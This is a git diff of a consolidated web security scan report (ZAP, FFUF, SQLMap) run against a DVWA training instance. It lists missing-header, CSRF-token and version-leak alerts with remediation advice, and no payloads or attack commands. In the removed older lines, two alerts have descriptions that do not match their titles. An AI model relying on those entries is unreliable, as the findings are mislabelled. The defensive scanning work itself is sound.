@@ -1,89 +1,17 @@
 # Reporte Consolidado de Seguridad
-**Fecha de generación:** 2026-06-25 20:54:03
+**Fecha de generación:** 2026-06-25 23:31:26
 
 ## Estadísticas Generales
-- **Total de URLs únicas analizadas:** 56
-- **URLs descubiertas por Spider:** 50
-- **Alertas identificadas por ZAP:** 52
+- **Total de URLs únicas analizadas:** 35
+- **URLs descubiertas por Spider:** 24
+- **Alertas identificadas por ZAP:** 37
 - **Rutas descubiertas por FFUF:** 8
-- **Vulnerabilidades detectadas por SQLMap:** 4
+- **Vulnerabilidades detectadas por SQLMap:** 8
 
 ## Detalles Técnicos: Alertas de ZAP
-### Absence of Anti-CSRF Tokens
-- **Severidad:** Medium (Low)
-- **URL:** `http://dvwa/vulnerabilities/captcha/`
-- **Método:** GET
-- **Descripción:** <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
-- **Solución:** <p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p><p>For example, use anti-CSRF packages such as the OWASP CSRFGuard.</p><p></p><p>Phase: Implementation</p><p>Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</p><p></p><p>Phase: Architecture and Design</p><p>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Use the ESAPI Session Management control.</p><p>This control includes a component for CSRF.</p><p></p><p>Do not use the GET method for any request that triggers a state change.</p><p></p><p>Phase: Implementation</p><p>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</p>
-
----
-### Absence of Anti-CSRF Tokens
-- **Severidad:** Medium (Low)
-- **URL:** `http://dvwa/vulnerabilities/exec/`
-- **Método:** GET
-- **Descripción:** <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
-- **Solución:** <p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p><p>For example, use anti-CSRF packages such as the OWASP CSRFGuard.</p><p></p><p>Phase: Implementation</p><p>Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</p><p></p><p>Phase: Architecture and Design</p><p>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Use the ESAPI Session Management control.</p><p>This control includes a component for CSRF.</p><p></p><p>Do not use the GET method for any request that triggers a state change.</p><p></p><p>Phase: Implementation</p><p>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</p>
-
----
-### Absence of Anti-CSRF Tokens
-- **Severidad:** Medium (Low)
-- **URL:** `http://dvwa/vulnerabilities/javascript/`
-- **Método:** GET
-- **Descripción:** <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
-- **Solución:** <p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p><p>For example, use anti-CSRF packages such as the OWASP CSRFGuard.</p><p></p><p>Phase: Implementation</p><p>Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</p><p></p><p>Phase: Architecture and Design</p><p>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Use the ESAPI Session Management control.</p><p>This control includes a component for CSRF.</p><p></p><p>Do not use the GET method for any request that triggers a state change.</p><p></p><p>Phase: Implementation</p><p>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</p>
-
----
-### Absence of Anti-CSRF Tokens
-- **Severidad:** Medium (Low)
-- **URL:** `http://dvwa/vulnerabilities/upload/`
-- **Método:** GET
-- **Descripción:** <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
-- **Solución:** <p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p><p>For example, use anti-CSRF packages such as the OWASP CSRFGuard.</p><p></p><p>Phase: Implementation</p><p>Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</p><p></p><p>Phase: Architecture and Design</p><p>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Use the ESAPI Session Management control.</p><p>This control includes a component for CSRF.</p><p></p><p>Do not use the GET method for any request that triggers a state change.</p><p></p><p>Phase: Implementation</p><p>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</p>
-
----
-### Absence of Anti-CSRF Tokens
-- **Severidad:** Medium (Low)
-- **URL:** `http://dvwa/vulnerabilities/weak_id/`
-- **Método:** GET
-- **Descripción:** <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
-- **Solución:** <p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p><p>For example, use anti-CSRF packages such as the OWASP CSRFGuard.</p><p></p><p>Phase: Implementation</p><p>Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</p><p></p><p>Phase: Architecture and Design</p><p>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Use the ESAPI Session Management control.</p><p>This control includes a component for CSRF.</p><p></p><p>Do not use the GET method for any request that triggers a state change.</p><p></p><p>Phase: Implementation</p><p>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</p>
-
----
-### CSP: Failure to Define Directive with No Fallback
-- **Severidad:** Medium (High)
-- **URL:** `http://dvwa/vulnerabilities/csp/`
-- **Método:** GET
-- **Descripción:** <p>The Content Security Policy fails to define one of the directives that has no fallback. Missing/excluding them is the same as allowing anything.</p>
-- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.</p>
-
----
-### CSP: Wildcard Directive
-- **Severidad:** Medium (High)
-- **URL:** `http://dvwa/vulnerabilities/csp/`
-- **Método:** GET
-- **Descripción:** <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
-- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.</p>
-
----
-### CSP: style-src unsafe-inline
-- **Severidad:** Medium (High)
-- **URL:** `http://dvwa/vulnerabilities/csp/`
-- **Método:** GET
-- **Descripción:** <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
-- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.</p>
-
----
 ### Content Security Policy (CSP) Header Not Set
 - **Severidad:** Medium (High)
-- **URL:** `http://dvwa`
-- **Método:** GET
-- **Descripción:** <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
-- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.</p>
-
----
-### Content Security Policy (CSP) Header Not Set
-- **Severidad:** Medium (High)
-- **URL:** `http://dvwa/`
+- **URL:** `http://dvwa/about.php`
 - **Método:** GET
 - **Descripción:** <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
 - **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.</p>
@@ -92,6 +20,14 @@
 ### Content Security Policy (CSP) Header Not Set
 - **Severidad:** Medium (High)
 - **URL:** `http://dvwa/instructions.php`
+- **Método:** GET
+- **Descripción:** <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
+- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.</p>
+
+---
+### Content Security Policy (CSP) Header Not Set
+- **Severidad:** Medium (High)
+- **URL:** `http://dvwa/login.php`
 - **Método:** GET
 - **Descripción:** <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
 - **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.</p>
@@ -155,23 +91,15 @@
 ---
 ### HTTP Only Site
 - **Severidad:** Medium (Medium)
-- **URL:** `http://dvwa/vulnerabilities/xss_s/`
-- **Método:** GET
-- **Descripción:** <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
-- **Solución:** <p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.</p>
-
----
-### Missing Anti-clickjacking Header
-- **Severidad:** Medium (Medium)
-- **URL:** `http://dvwa`
-- **Método:** GET
-- **Descripción:** <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
-- **Solución:** <p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.</p>
-
----
-### Missing Anti-clickjacking Header
-- **Severidad:** Medium (Medium)
 - **URL:** `http://dvwa/`
+- **Método:** GET
+- **Descripción:** <p>The site is only served under HTTP and not HTTPS.</p>
+- **Solución:** <p>Configure your web or application server to use SSL (https).</p>
+
+---
+### Missing Anti-clickjacking Header
+- **Severidad:** Medium (Medium)
+- **URL:** `http://dvwa/about.php`
 - **Método:** GET
 - **Descripción:** <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
 - **Solución:** <p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.</p>
@@ -187,7 +115,7 @@
 ---
 ### Missing Anti-clickjacking Header
 - **Severidad:** Medium (Medium)
-- **URL:** `http://dvwa/setup.php`
+- **URL:** `http://dvwa/instructions.php?doc=readme`
 - **Método:** GET
 - **Descripción:** <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
 - **Solución:** <p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.</p>
@@ -195,26 +123,18 @@
 ---
 ### Missing Anti-clickjacking Header
 - **Severidad:** Medium (Medium)
-- **URL:** `http://dvwa/vulnerabilities/csrf/`
+- **URL:** `http://dvwa/login.php`
 - **Método:** GET
 - **Descripción:** <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
 - **Solución:** <p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.</p>
 
 ---
-### Sub Resource Integrity Attribute Missing
-- **Severidad:** Medium (High)
-- **URL:** `http://dvwa/vulnerabilities/captcha/`
+### Missing Anti-clickjacking Header
+- **Severidad:** Medium (Medium)
+- **URL:** `http://dvwa/setup.php`
 - **Método:** GET
-- **Descripción:** <p>The integrity attribute is missing on a script or link tag served by an external server. The integrity tag prevents an attacker who have gained access to this server from injecting a malicious content.</p>
-- **Solución:** <p>Provide a valid integrity attribute to the tag.</p>
-
----
-### Cross-Domain JavaScript Source File Inclusion
-- **Severidad:** Low (Medium)
-- **URL:** `http://dvwa/vulnerabilities/captcha/`
-- **Método:** GET
-- **Descripción:** <p>The page includes one or more script files from a third-party domain.</p>
-- **Solución:** <p>Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.</p>
+- **Descripción:** <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
+- **Solución:** <p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.</p>
 
 ---
 ### In Page Banner Information Leak
@@ -259,7 +179,15 @@
 ---
 ### Server Leaks Version Information via "Server" HTTP Response Header Field
 - **Severidad:** Low (High)
-- **URL:** `http://dvwa/`
+- **URL:** `http://dvwa/dvwa/css/login.css`
+- **Método:** GET
+- **Descripción:** <p>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>
+- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.</p>
+
+---
+### Server Leaks Version Information via "Server" HTTP Response Header Field
+- **Severidad:** Low (High)
+- **URL:** `http://dvwa/login.php`
 - **Método:** GET
 - **Descripción:** <p>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>
 - **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.</p>
@@ -268,14 +196,6 @@
 ### Server Leaks Version Information via "Server" HTTP Response Header Field
 - **Severidad:** Low (High)
 - **URL:** `http://dvwa/robots.txt`
-- **Método:** GET
-- **Descripción:** <p>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>
-- **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.</p>
-
----
-### Server Leaks Version Information via "Server" HTTP Response Header Field
-- **Severidad:** Low (High)
-- **URL:** `http://dvwa/setup.php`
 - **Método:** GET
 - **Descripción:** <p>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.</p>
 - **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.</p>
@@ -289,25 +209,33 @@
 - **Solución:** <p>Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.</p>
 
 ---
-### Timestamp Disclosure - Unix
-- **Severidad:** Low (Low)
-- **URL:** `http://dvwa/vulnerabilities/javascript/`
+### X-Content-Type-Options Header Missing
+- **Severidad:** Low (Medium)
+- **URL:** `http://dvwa/dvwa/css/login.css`
 - **Método:** GET
-- **Descripción:** <p>A timestamp was disclosed by the application/web server. - Unix</p>
-- **Solución:** <p>Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.</p>
+- **Descripción:** <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
+- **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
 
 ---
 ### X-Content-Type-Options Header Missing
 - **Severidad:** Low (Medium)
-- **URL:** `http://dvwa`
+- **URL:** `http://dvwa/dvwa/images/RandomStorm.png`
 - **Método:** GET
-- **Descripción:** <p>A timestamp was disclosed by the application/web server. - Unix</p>
-- **Solución:** <p>Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.</p>
+- **Descripción:** <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
+- **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
 
 ---
 ### X-Content-Type-Options Header Missing
 - **Severidad:** Low (Medium)
-- **URL:** `http://dvwa/`
+- **URL:** `http://dvwa/dvwa/images/login_logo.png`
+- **Método:** GET
+- **Descripción:** <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
+- **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
+
+---
+### X-Content-Type-Options Header Missing
+- **Severidad:** Low (Medium)
+- **URL:** `http://dvwa/login.php`
 - **Método:** GET
 - **Descripción:** <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
 - **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
@@ -321,30 +249,6 @@
 - **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
 
 ---
-### X-Content-Type-Options Header Missing
-- **Severidad:** Low (Medium)
-- **URL:** `http://dvwa/setup.php`
-- **Método:** GET
-- **Descripción:** <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
-- **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
-
----
-### X-Content-Type-Options Header Missing
-- **Severidad:** Low (Medium)
-- **URL:** `http://dvwa/vulnerabilities/csrf/`
-- **Método:** GET
-- **Descripción:** <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
-- **Solución:** <p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p>
-
----
-### Authentication Request Identified
-- **Severidad:** Informational (High)
-- **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
-- **Método:** GET
-- **Descripción:** <p>The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to "Auto-Detect" then this rule will change the authentication to match the request identified.</p>
-- **Solución:** <p>This is an informational alert rather than a vulnerability and so there is nothing to fix.</p>
-
----
 ### Authentication Request Identified
 - **Severidad:** Informational (High)
 - **URL:** `http://dvwa/login.php`
@@ -353,22 +257,6 @@
 - **Solución:** <p>This is an informational alert rather than a vulnerability and so there is nothing to fix.</p>
 
 ---
-### Information Disclosure - Sensitive Information in URL
-- **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
-- **Método:** GET
-- **Descripción:** <p>The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.</p>
-- **Solución:** <p>Do not pass sensitive information in URIs.</p>
-
----
-### Information Disclosure - Sensitive Information in URL
-- **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/csrf/?Change=Change&password_conf=ZAP&password_new=ZAP`
-- **Método:** GET
-- **Descripción:** <p>The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.</p>
-- **Solución:** <p>Do not pass sensitive information in URIs.</p>
-
----
 ### Information Disclosure - Suspicious Comments
 - **Severidad:** Informational (Medium)
 - **URL:** `http://dvwa/setup.php`
@@ -377,17 +265,9 @@
